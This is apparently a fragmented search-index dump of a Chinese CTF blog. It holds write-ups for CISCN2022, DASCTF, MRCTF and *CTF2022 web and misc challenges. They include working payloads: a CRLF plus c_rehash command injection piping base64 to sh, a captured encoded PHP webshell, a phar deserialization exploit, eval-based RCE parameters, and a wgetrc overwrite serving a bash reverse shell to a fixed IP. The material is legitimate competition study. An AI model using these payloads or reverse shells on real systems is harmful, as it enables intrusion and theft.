如果通过了过滤，那么就会进行file_get_contents函数，进行文件读取 private function check() { try{ $arr = explode('.', $this-\u003etpl); $ext = end($arr); if (in_array($ext, ['php', 'php2', 'php3', 'php4', 'php5', 'php6', 'php7', 'phtml'])): return false; endif; $content = file_get_contents($this-\u003etpl); if (!$content): return false; endif; if ( preg_match('/script|\u003c\\?/i', $content) ): return false; endif; } catch (Exception $e) { return false; } return true; } 那我们就可以进行除了php文件外，任意文件的读取了 这里如果tpl是debug的话，会给phpinfo 这里是开启了zend_opcache，这里我们利用包含opcache进行攻击 首先得计算systemid，这个的计算可以利用工具https://github.com/GoSecure/php7-opcache-override/ 然后就是任意文件读取了 http://172.16.9.44:8091/?tpl=..//…//…//…//…/var/www/cache/1116d566fdc53f79abce6c01e3a0308d/var/www/html/flag.php.bin ","date":"2022-06-24","objectID":"/ciscn2022_half/:0:0","series":null,"tags":null,"title":"[CISCN2022] Semifinals","uri":"/ciscn2022_half/#template"},{"categories":["CTF"],"content":"0x01 前期准备","date":"2022-05-31","objectID":"/ciscn2022_crt/:0:0","series":null,"tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/#0x01-前期准备"},{"categories":["CTF"],"content":"源码题目源码用于本地的调试，有所改动，考虑篇幅，只展示重要逻辑代码 app.py @app.route('/getcrt', methods=['GET', 'POST']) def upload(): Country = request.form.get(\"Country\", \"CN\") Province = request.form.get(\"Province\", \"a\") City = request.form.get(\"City\", \"a\") OrganizationalName = request.form.get(\"OrganizationalName\", \"a\") CommonName = request.form.get(\"CommonName\", \"a\") EmailAddress = request.form.get(\"EmailAddress\", \"a\") return get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress) @app.route('/createlink', methods=['GET']) def info(): json_data = {\"info\": os.popen(\"c_rehash static/crt/ \u0026\u0026 ls static/crt/\").read()} return json.dumps(json_data) @app.route('/proxy', methods=['GET']) def proxy(): uri = request.form.get(\"uri\", \"/\") client = socket.socket() client.connect(('localhost', 8887)) msg = f'''GET {uri}HTTP/1.1 Host: test_api_host User-Agent: Guest Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ''' client.send(msg.encode()) data = client.recv(2048) client.close() return data.decode() app.run(host=\"0.0.0.0\", port=8888) main.go package main import ( \"github.com/gin-gonic/gin\" \"os\" \"strings\" ) func admin(c *gin.Context) { staticPath := \"../static/crt/\" oldname := c.DefaultQuery(\"oldname\", \"\") newname := c.DefaultQuery(\"newname\", \"\") if oldname == \"\" || newname == \"\" || strings.Contains(oldname, \"..\") || strings.Contains(newname, \"..\") { c.String(500, \"error\") return } if c.Request.URL.RawPath != \"\" \u0026\u0026 c.Request.Host == \"admin\" { err := os.Rename(staticPath+oldname, staticPath+newname) if err != nil { return } c.String(200, newname) return } c.String(200, \"no\") } func index(c *gin.Context) { c.String(200, \"hello world\") } func main() { router := gin.Default() router.GET(\"/\", index) router.GET(\"/admin/rename\", admin) if err := router.Run(\":8887\"); err != nil { panic(err) } } ","date":"2022-05-31","objectID":"/ciscn2022_crt/:1:0","series":null,"tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/#源码"},{"categories":["CTF"],"content":"服务启动因为flask里直接执行了命令，所以我们得把这个文件放到py文件的同级目录 接着启动服务，分别执行. python3 app.py go run main.go ","date":"2022-05-31","objectID":"/ciscn2022_crt/:2:0","series":null,"tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/#服务启动"},{"categories":["CTF"],"content":"0x02 题目逻辑这里题目的逻辑大致是这样： 首先通过getcrt路由生成crt文件，然后利用go里的admin/rename去修改文件名，最后利用createlink里的c_rehash执行命令 可以看到proxy里面，是拼接了一个http包的 这里不免想到CRLF，进了go里面，那么有这样的条件需要满足 if c.Request.URL.RawPath != \"\" \u0026\u0026 c.Request.Host == \"admin\" { err := os.Rename(staticPath+oldname, staticPath+newname) if err != nil { return } c.String(200, newname) return } c.String(200, \"no\") ","date":"2022-05-31","objectID":"/ciscn2022_crt/:0:0","series":null,"tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/#0x02-题目逻辑"},{"categories":["CTF"],"content":"c.Request.URL.RawPath的绕过首先是c.Request.URL.RawPath，这个的绕过方法是url编码，我们用%252f代替/来绕过这个 接着是host得是admin，这里我们可以用CRLF来实现 ","date":"2022-05-31","objectID":"/ciscn2022_crt/:1:0","series":null,"tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/#crequesturlrawpath的绕过"},{"categories":["CTF"],"content":"c_rehash的RCE:CVE-2022-1292这里是给了c_rehash的源码的，先搜了一下这个cve，找到官方的修复方案，发现是在这里进行了修复 那么我们就可以对这里分析一下，这里可以从fname这里进行代码注入，类似于这样 1.crt\"||id\u003e1.txt||echo\" 那么思路就清晰了 ","date":"2022-05-31","objectID":"/ciscn2022_crt/:2:0","series":null,"tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/#c_rehash的rcecve-2022-1292"},{"categories":["CTF"],"content":"最后逻辑我们先生成一个crt记录下文件名，然后通过proxy，到go的/admin/rename下，通过CRLF绕过host的判断，把文件名修改成代码注入的样子，最后通过createlink执行c_rehash进行命令执行 但是最后有一个问题，就是这里fname还是有过滤的，是不能出现斜杠，那么我们就没有办法读取到其他目录下的文件了，这里的绕过逻辑是通过base64进行消敏 $fname =~ s/\\\"/\\\\\\\"/g; payload： uri=/admin%252frename?oldname=8c3bcef7-62f5-476c-9c9d-9dc7054a5533.crt%26newname=1.crt\"||echo${IFS}\"Y2F0IC9mbGFnPnpob25nM2Nj\"|base64${IFS}-d|sh${IFS}-i\"%20HTTP/1.1%0d%0aHost:%20admin%0d%0a%0d%0aGET%20/ 成功修改文件名 然后再到createlink执行命令 访问static/crt/1.txt，成功读取到/etc/passwd ","date":"2022-05-31","objectID":"/ciscn2022_crt/:3:0","series":null,"tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/#最后逻辑"},{"categories":["CTF"],"content":"tricks这里绕过Host判断，可以不用CRLF来绕过，这里可以用http://admin/admin/rename来绕过 可以看到是可以成功绕过的 ","date":"2022-05-31","objectID":"/ciscn2022_crt/:4:0","series":null,"tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/#tricks"},{"categories":null,"content":" Name Blog mung29 http://dongyu29.xyz Thnpkm http://thnpkm.xyz/ Sunlight https://sunlight316.cn Yenkoc https://yenkoc.github.io/ Zhong3 https://www.ieven762.cn/ Aur0ra https://www.cnblogs.com/Aurora-M/ Whitebird https://whitebird0.github.io/ Harvey https://harvey.plus/ W0nderMaker https://blog.csdn.net/wuyvle Zima Blue https://www.zimablue.life/ MiaoTony https://miaotony.xyz/ h0cksr http://h0cksr.xyz/ Pupi1 https://pupil857.github.io/ 书鱼 https://bkfish.github.io/ ","date":"2022-05-30","objectID":"/friends/:0:0","series":null,"tags":null,"title":"友情链接","uri":"/friends/#"},{"categories":["CTF"],"content":"Misc","date":"2022-04-25","objectID":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/:1:0","series":null,"tags":null,"title":"[2022DASCTF Apr X FATE 防疫挑战赛] WP","uri":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/#misc"},{"categories":["CTF"],"content":"SimpleFlow看流量大概是上传了一个后门，但是会对payload加密，这里发现有flag.txt被打包 后面的包里面发现flag.zip 但是打开需要密码，那么我们就要回去压缩的地方，看看给的什么密码，所以我们就得解开这个流量 @eval(@base64_decode($_POST['m8f8d9db647ecd'])); \u0026e57fb9c067c677=o3 \u0026g479cf6f058cf8=1DY2QgIi9Vc2Vycy9jaGFuZy9TaXRlcy90ZXN0Ijt6aXAgLVAgUGFTc1ppUFdvckQgZmxhZy56aXAgLi4vZmxhZy50eHQ7ZWNobyBbU107cHdkO2VjaG8gW0Vd \u0026m8f8d9db647ecd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiYjYzYmEiLiI3ZGZhMjAiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjgwZSIuIjExYSI7fW9iX3N0YXJ0KCk7dHJ5eyRwPWJhc2U2NF9kZWNvZGUoc3Vic3RyKCRfUE9TVFsibzFmYWViZDRlYzNkOTciXSwyKSk7JHM9YmFzZTY0X2RlY29kZShzdWJzdHIoJF9QT1NUWyJnNDc5Y2Y2ZjA1OGNmOCJdLDIpKTskZW52c3RyPUBiYXNlNjRfZGVjb2RlKHN1YnN0cigkX1BPU1RbImU1N2ZiOWMwNjdjNjc3Il0sMikpOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjtpZihzdWJzdHIoJGQsMCwxKT09Ii8iKXtAcHV0ZW52KCJQQVRIPSIuZ2V0ZW52KCJQQVRIIikuIjovdXNyL2xvY2FsL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9zYmluOi91c3IvYmluOi9zYmluOi9iaW4iKTt9ZWxzZXtAcHV0ZW52KCJQQVRIPSIuZ2V0ZW52KCJQQVRIIikuIjtDOi9XaW5kb3dzL3N5c3RlbTMyO0M6L1dpbmRvd3MvU3lzV09XNjQ7QzovV2luZG93cztDOi9XaW5kb3dzL1N5c3RlbTMyL1dpbmRvd3NQb3dlclNoZWxsL3YxLjAvOyIpO31pZighZW1wdHkoJGVudnN0cikpeyRlbnZhcnI9ZXhwbG9kZSgifHx8YXNsaW5lfHx8IiwgJGVudnN0cik7Zm9yZWFjaCgkZW52YXJyIGFzICR2KSB7aWYgKCFlbXB0eSgkdikpIHtAcHV0ZW52KHN0cl9yZXBsYWNlKCJ8fHxhc2tleXx8fCIsICI9IiwgJHYpKTt9fX0kcj0ieyRwfSB7JGN9IjtmdW5jdGlvbiBmZSgkZil7JGQ9ZXhwbG9kZSgiLCIsQGluaV9nZXQoImRpc2FibGVfZnVuY3Rpb25zIikpO2lmKGVtcHR5KCRkKSl7JGQ9YXJyYXkoKTt9ZWxzZXskZD1hcnJheV9tYXAoJ3RyaW0nLGFycmF5X21hcCgnc3RydG9sb3dlcicsJGQpKTt9cmV0dXJuKGZ1bmN0aW9uX2V4aXN0cygkZikmJmlzX2NhbGxhYmxlKCRmKSYmIWluX2FycmF5KCRmLCRkKSk7fTtmdW5jdGlvbiBydW5zaGVsbHNob2NrKCRkLCAkYykge2lmIChzdWJzdHIoJGQsIDAsIDEpID09ICIvIiAmJiBmZSgncHV0ZW52JykgJiYgKGZlKCdlcnJvcl9sb2cnKSB8fCBmZSgnbWFpbCcpKSkge2lmIChzdHJzdHIocmVhZGxpbmsoIi9iaW4vc2giKSwgImJhc2giKSAhPSBGQUxTRSkgeyR0bXAgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgJ2FzJyk7cHV0ZW52KCJQSFBfTE9MPSgpIHsgeDsgfTsgJGMgPiR0bXAgMj4mMSIpO2lmIChmZSgnZXJyb3JfbG9nJykpIHtlcnJvcl9sb2coImEiLCAxKTt9IGVsc2Uge21haWwoImFAMTI3LjAuMC4xIiwgIiIsICIiLCAiLWJ2Iik7fX0gZWxzZSB7cmV0dXJuIEZhbHNlO30kb3V0cHV0ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCR0bXApO0B1bmxpbmsoJHRtcCk7aWYgKCRvdXRwdXQgIT0gIiIpIHtwcmludCgkb3V0cHV0KTtyZXR1cm4gVHJ1ZTt9fXJldHVybiBGYWxzZTt9O2Z1bmN0aW9uIHJ1bmNtZCgkYyl7JHJldD0wOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZihmZSgnc3lzdGVtJykpe0BzeXN0ZW0oJGMsJHJldCk7fWVsc2VpZihmZSgncGFzc3RocnUnKSl7QHBhc3N0aHJ1KCRjLCRyZXQpO31lbHNlaWYoZmUoJ3NoZWxsX2V4ZWMnKSl7cHJpbnQoQHNoZWxsX2V4ZWMoJGMpKTt9ZWxzZWlmKGZlKCdleGVjJykpe0BleGVjKCRjLCRvLCRyZXQpO3ByaW50KGpvaW4oIgoiLCRvKSk7fWVsc2VpZihmZSgncG9wZW4nKSl7JGZwPUBwb3BlbigkYywncicpO3doaWxlKCFAZmVvZigkZnApKXtwcmludChAZmdldHMoJGZwLDIwNDgpKTt9QHBjbG9zZSgkZnApO31lbHNlaWYoZmUoJ3Byb2Nfb3BlbicpKXskcCA9IEBwcm9jX29wZW4oJGMsIGFycmF5KDEgPT4gYXJyYXkoJ3BpcGUnLCAndycpLCAyID0+IGFycmF5KCdwaXBlJywgJ3cnKSksICRpbyk7d2hpbGUoIUBmZW9mKCRpb1sxXSkpe3ByaW50KEBmZ2V0cygkaW9bMV0sMjA0OCkpO313aGlsZSghQGZlb2YoJGlvWzJdKSl7cHJpbnQoQGZnZXRzKCRpb1syXSwyMDQ4KSk7fUBmY2xvc2UoJGlvWzFdKTtAZmNsb3NlKCRpb1syXSk7QHByb2NfY2xvc2UoJHApO31lbHNlaWYoZmUoJ2FudHN5c3RlbScpKXtAYW50c3lzdGVtKCRjKTt9ZWxzZWlmKHJ1bnNoZWxsc2hvY2soJGQsICRjKSkge3JldHVybiAkcmV0O31lbHNlaWYoc3Vic3RyKCRkLDAsMSkhPSIvIiAmJiBAY2xhc3NfZXhpc3RzKCJDT00iKSl7JHc9bmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOyRlPSR3LT5leGVjKCRjKTskc289JGUtPlN0ZE91dCgpOyRyZXQuPSRzby0+UmVhZEFsbCgpOyRzZT0kZS0+U3RkRXJyKCk7JHJldC49JHNlLT5SZWFkQWxsKCk7cHJpbnQoJHJldCk7fWVsc2V7JHJldCA9IDEyNzt9cmV0dXJuICRyZXQ7fTskcmV0PUBydW5jbWQoJHIuIiAyPiYxIik7cHJpbnQgKCRyZXQhPTApPyJyZXQ9eyRyZXR9IjoiIjs7fWNhdGNoKEV4Y2VwdGlvbiAkZSl7ZWNobyAiRVJST1I6Ly8iLiRlLT5nZXRNZXNzYWdlKCk7fTthc291dHB1dCgpO2RpZSgpOw== \u0026o1faebd4ec3d97=WaL2Jpbi9zaA== 这个很长的解开是就是加密的木马 \u003c?php @ini_set(\"display_errors\", \"0\");@set_time_limit(0);function asenc($out){return $out;};function asoutput(){$output=ob_get_c","date":"2022-04-25","objectID":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/:1:1","series":null,"tags":null,"title":"[2022DASCTF Apr X FATE 防疫挑战赛] WP","uri":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/#simpleflow"},{"categories":["CTF"],"content":"Web","date":"2022-04-25","objectID":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/:2:0","series":null,"tags":null,"title":"[2022DASCTF Apr X FATE 防疫挑战赛] WP","uri":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/#web"},{"categories":["CTF"],"content":"warmup-php在构造函数里面，会调用一个run方法 $object-\u003erun(); 有run方法的只有listview public function run() { echo \"\u003c\".$this-\u003etagName.\"\u003e\\n\"; $this-\u003erenderContent(); echo \"\u003c\".$this-\u003etagName.\"\u003e\\n\"; } 执行命令的地方在Base的evaluateExpression里面，这里最底层的类是TestView，所以我们从这里分析 这里的renderTableRow方法里面会进入evaluateExpression，而renderTableRow可以从renderTableBody进入 再回头来看run方法，调用run方法以后进入renderContent，这里会进入renderSection，这里会进行一拼接 所以我们可以利用这个进入renderTableBody，这样利用链就出来了 Action-\u003erun()-\u003erenderContent()-\u003erenderSection()-\u003erenderTableBody()-\u003erenderTableRow()-\u003eevaluateExpression() 那么就看看怎么传参，首先是action，是最底层的类TestView，然后看properties，这里会循环为对象属性赋值 highlight_file(__FILE__); error_reporting(0); $action = $_GET['action']; $properties = $_POST['properties']; class Action{ public function __construct($action,$properties){ $object=new $action(); foreach($properties as $name=\u003e$value) $object-\u003e$name=$value; $object-\u003erun(); } } new Action($action,$properties); 我们进入TestView去看看，首先看执行的命令，是rowHtmlOptionsExpression属性 所以赋值为eval($_POST[1])，还需要有一个参数data，这个并不影响，所以我们可以随便附一个值 再往回走到ListView里面，这里是执行了一个无参的方法，我们前面分析的是从renderTableBody进去renderTableRow，所以这里我们需要以数组的形式拼接一个TableBody 那么传参为properties[template]={TableBody} 最后的payload get ?action=TestView post 1=system('whoami');\u0026properties[data]=ph\u0026properties[rowHtmlOptionsExpression]=eval($_POST[1])\u0026properties[template]={TableBody} 在/readflag拿到flag ","date":"2022-04-25","objectID":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/:2:1","series":null,"tags":null,"title":"[2022DASCTF Apr X FATE 防疫挑战赛] WP","uri":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/#warmup-php"},{"categories":["CTF"],"content":"soeasy_php发现有个editor.php 使用下面的payload可以任意文件读取 png=../../../../../../etc/passwd\u0026flag=1 读一下源码 upload.php \u003c?php if (!isset($_FILES['file'])) { die(\"请上传头像\"); } $file = $_FILES['file']; $filename = md5(\"png\".$file['name']).\".png\"; $path = \"uploads/\".$filename; if(move_uploaded_file($file['tmp_name'],$path)){ echo \"上传成功： \".$path; }; editor.php \u003c?php class flag{ public function copyflag(){ exec(\"/copyflag\"); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt echo \"SFTQL\"; } public function __destruct(){ $this-\u003ecopyflag(); } } function filewrite($file,$data){ unlink($file); file_put_contents($file, $data); } if(isset($_POST['png'])){ $filename = $_POST['png']; if(!preg_match(\"/:|phar|\\/\\/|php/im\",$filename)){ $f = fopen($filename,\"r\"); $contents = fread($f, filesize($filename)); if(strpos($contents,\"flag{\") !== false){ filewrite($filename,\"Don't give me flag!!!\"); } } if(isset($_POST['flag'])) { $flag = (string)$_POST['flag']; if ($flag == \"Give me flag\") { filewrite(\"/tmp/flag.txt\", \"Don't give me flag\"); sleep(2); die(\"no no no !\"); } else { filewrite(\"/tmp/flag.txt\", $flag); //不给我看我自己写个flag。 } $head = \"uploads/head.png\"; unlink($head); if (symlink($filename, $head)) { echo \"成功更换头像\"; } else { unlink($filename); echo \"非正常文件，已被删除\"; }; } } 发现新大陆，这里大概的逻辑是这样，有一个类flag，在下面是把post[png]的值创建一个软链到uploads/head.png，这里用了unlink，又有class，而且涉及到文件操作，基本锁定是phar反序列化了，而unlink可以触发phar反序列化 这里的flag类里面执行了这样的文件 以root权限复制/flag 到 /tmp/flag.txt 但是这里会把post[flag]写进/tmp/flag.txt，这里就有矛盾了 如果我们要读文件/tmp/flag.txt，那么就得再次触发这个，那么就会把post[flag]写进/tmp/flag 这样我们之前写的flag就没了，那么这里就是需要一个竞争了 还有一个难点，我们得触发phar反序列化，而触发点在这 要进这个点，那么就只能让symlink报错才行，一开始尝试加个%00，虽然成功报错，但是无法反序列化了，这里是需添加脏数据来报错 那么就开始构造payload： phar文件构造 \u003c?php class flag{ public function copyflag(){ exec(\"/copyflag\"); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt echo \"SFTQL\"; } public function __destruct(){ $this-\u003ecopyflag(); } } $a = new flag(); @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); $phar-\u003estartBuffering(); $phar-\u003esetStub(\"\u003c?php __HALT_COMPILER(); ?\u003e\"); $phar-\u003esetMetadata($a); $phar-\u003eaddFromString(\"test.txt\", \"test\"); $phar-\u003estopBuffering(); 上传拿到路径uploads/fe409167fb98b72dcaff5486a612a575.png 尝试添加脏数据，成功反序列化 那么就可以开始条件竞争了 phar反序列化的触发 软链指向uploads/head.png 访问uploads/head.png拿到信息 编写如下脚本 import requests import threading import time url = \"http://94b52e33-8f81-4589-899f-482f234c6cac.node4.buuoj.cn:81\" png = \"/uploads/head.png\" flag = \"../../../../../../tmp/flag.txt\" phar = \"\"\"phar://../../../../../../var/www/html/uploads/fe409167fb98b72dcaff5486a612a575.png/test.txtaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","date":"2022-04-25","objectID":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/:2:2","series":null,"tags":null,"title":"[2022DASCTF Apr X FATE 防疫挑战赛] WP","uri":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/#soeasy_php"},{"categories":["CTF"],"content":"Misc","date":"2022-04-25","objectID":"/mrctf2022_wp/:1:0","series":null,"tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/#misc"},{"categories":["CTF"],"content":"checkin翻源码找到flag ","date":"2022-04-25","objectID":"/mrctf2022_wp/:1:1","series":null,"tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/#checkin"},{"categories":["CTF"],"content":"Web","date":"2022-04-25","objectID":"/mrctf2022_wp/:2:0","series":null,"tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/#web"},{"categories":["CTF"],"content":"WebCheckIn上传东西上去发现没有回显，然后试着传其他的文件上去，发现随手写的php文件上传上去了，返回了路径 然后就往里面加了一句话木马进去了 然后发现根目录没有flag 而且只是www权限，猜测是不是要提权，看了一下php文件的权限就是root 于是直接用php文件反弹shell，直接反弹shell不行，会报错，这里用的curl反弹shell 进去直接find搜flag，成功拿到 ","date":"2022-04-25","objectID":"/mrctf2022_wp/:2:1","series":null,"tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/#webcheckin"},{"categories":["CTF"],"content":"Bonus","date":"2022-04-25","objectID":"/mrctf2022_wp/:3:0","series":null,"tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/#bonus"},{"categories":["CTF"],"content":"Java_mem_shell_Basic打开是tomcat的默认页面，进入manage看看，弱口令tomcat:tomcat登录成功，进了manage就可以随便getshell了 这里把冰蝎马打包一个war包，然后传上去拿到shell jar cvf hmnb.war shellmh.jsp 然后连进冰蝎，而且给的直接就是root权限 感觉冰蝎的终端不好用，反弹一个shell 直接find查找到flag ","date":"2022-04-25","objectID":"/mrctf2022_wp/:3:1","series":null,"tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/#java_mem_shell_basic"},{"categories":["CTF"],"content":"Java_mem_shell_Filter进入是一个登录页面 目录扫描没啥结果 尝试爆破一个账号密码，爆破了一大堆，找不到可用的 尝试sql注入，试了很多，根本试不出报错，尝试跑一下sqlmap，还是无果 后来发现是log4j。。。 马上来打一波 进去以后，发现web目录有一个godzilla，密码拿到了，密钥是默认的key 连进哥斯拉里面 find没找到flag，结合题目名理解，可能是在filter内存马里面，这里用jmapdump出jvm内存 首先查看pid： ps -ef|grep java 然后dump：jmap -dump:format=b,file=e.bin 51 然后下载出来 找到flag ","date":"2022-04-25","objectID":"/mrctf2022_wp/:3:2","series":null,"tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/#java_mem_shell_filter"},{"categories":["CTF"],"content":"New相对于oh_my_lotto，revenge进行了下面的更改 这么做，我们能走的就只有RCE了，而这里唯一能操作的一个地方就是这里，可以操作环境变量 os.environ[lotto_key] = lotto_value 这里有几个非预期解，先看看预期解 ","date":"2022-04-20","objectID":"/ctf2022_oh-my-lotto-revenge/:1:0","series":null,"tags":null,"title":"[*CTF2022] oh-my-lotto-revenge","uri":"/ctf2022_oh-my-lotto-revenge/#new"},{"categories":["CTF"],"content":"Intented writeup这里可以操控环境变量，那么我们能做的事情就很多了，预期解是操控HOSTALIASES修改hosts 因为他的wget是通过域名下载的 os.system('wget --content-disposition -N lotto') 我们把伪造的hosts文件通过forecast路由传到服务器，然后修改环境变量把hosts指向/app/guess/forecast.txt 剩下的就是如何利用了，可以发现wget的参数是--content-disposition -N 对于这个参数的意义，我在谷歌找到了如下定义：他是可以由服务器端决定下载的文件，-N表示文件名不变进行覆盖 、 这样的话，我们就可以操控他下载的文件，去进行覆盖app.py 我查找了这个http头的语法 我们只需要在http头指定app.py即可把恶意的app.py覆盖掉源文件 这样的话我们就可以编写如下poc app.py import flask import os app = flask.Flask(__name__) @app.route(\"/rce\") def rce(): return str(os.popen('env').read()) if __name__ == \"__main__\": app.run(debug=True,host='0.0.0.0', port=8080) main.py import flask import os app = flask.Flask(__name__) @app.route(\"/\") def index(): with open('app.py','rb') as f: res = f.read() r = flask.make_response(res) response.headers['Content-Type'] = 'text/plain' response.headers['Content-Disposition'] = 'attachment; filename=app.py' return response if __name__ == \"__main__\": app.run(debug=True,host='0.0.0.0', port=8899) 在服务器启动main.py，然后上传伪造hosts文件 # hosts lotto domain 然后在lotto页面修改环境变量 HOSTALIASES /app/guess/forecast.txt 然后在服务器添加反代，把8899端口转发到80端口 可以发现app.py成功被覆盖 但是发现他还是原来的服务 是因为服务是gunicorn搭建起来的，他更新py文件以后不会实时更新，而gunicorn有一个pre-forked worker机制，当某个worker超时以后，就会让gunicorn重启该worker 我们可以抓包进行爆破服务让他崩溃重启 崩溃后，成功拿到flag 预期解至此 ","date":"2022-04-20","objectID":"/ctf2022_oh-my-lotto-revenge/:2:0","series":null,"tags":null,"title":"[*CTF2022] oh-my-lotto-revenge","uri":"/ctf2022_oh-my-lotto-revenge/#intented-writeup"},{"categories":["CTF"],"content":"Unintented writeup非预期解，这里我只知道一直就是利用WGETRC，配合http_proxy和output_document，覆盖本地的wget应用，然后利用wget完成RCE 查官方文档可知，wget会找环境变量WGETRC，加载wgetrc文件 而具体利用wgetrc就是看这篇官方文档 这样的话，就是通过上传我们构造的wgetrc去进行攻击 这里注意了这几个配置项 # 把记录写到file里 output_document = file Set the output filename—the same as ‘-O file’. # 设置HTTP代理 http_proxy = string Use string as HTTP proxy, instead of the one specified in environment. 我在本机测试了一下，设置了http_proxy以后，wget下载的都是代理服务器的文件 通过这个代理服务器，我们可以通过修改代理服务器的东西去修改返回值，然后利用output_document进行覆盖 ","date":"2022-04-20","objectID":"/ctf2022_oh-my-lotto-revenge/:3:0","series":null,"tags":null,"title":"[*CTF2022] oh-my-lotto-revenge","uri":"/ctf2022_oh-my-lotto-revenge/#unintented-writeup"},{"categories":["CTF"],"content":"0x01因为我们只能执行wget，所以我们直接索性覆盖wget 构造如下wgetrc文件 output_document = /usr/bin/wget http_proxy = test.huamang.xyz https_proxy = test.huamang.xyz 在代理服务器开一个80端口的web服务，写着反弹shell的命令 #!/bin/bash bash -c \"bash -i \u003c /dev/tcp/10.211.55.4/8888 1\u003c\u00260 2\u003c\u00260\" 